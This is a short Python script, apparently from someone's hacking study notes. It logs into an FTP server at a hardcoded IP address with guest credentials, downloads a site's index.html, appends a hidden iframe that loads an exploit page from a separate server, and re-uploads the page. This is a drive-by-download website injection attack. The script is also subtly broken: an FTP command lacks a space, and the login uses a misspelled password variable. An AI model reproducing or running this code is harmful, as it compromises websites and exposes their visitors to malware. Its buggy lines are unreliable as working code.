# this file is the studying notes of Learnbgame/hack
#
#

import ftplib

def injectPage(ftp,page,redirect):
    f = open(page + '.tmp','w')
    ftp.retrlines('RETR'+page,f.write)
    print('[+] Downloaded Page: ' + page)
    f.write(redirect)
    f.close()
    print('[+] Injected Mailcious IFrame on: ' + page)
    ftp.storlines('STOR ' + page,open(page + '.tmp'))
    print('[+] Uploaded Injected Page: ' + page)
    
host = '218.198.196.138'
userName = 'guest'
password = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName,passWord)
redirect = '<iframe src = "http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp,'index.html',redirect)













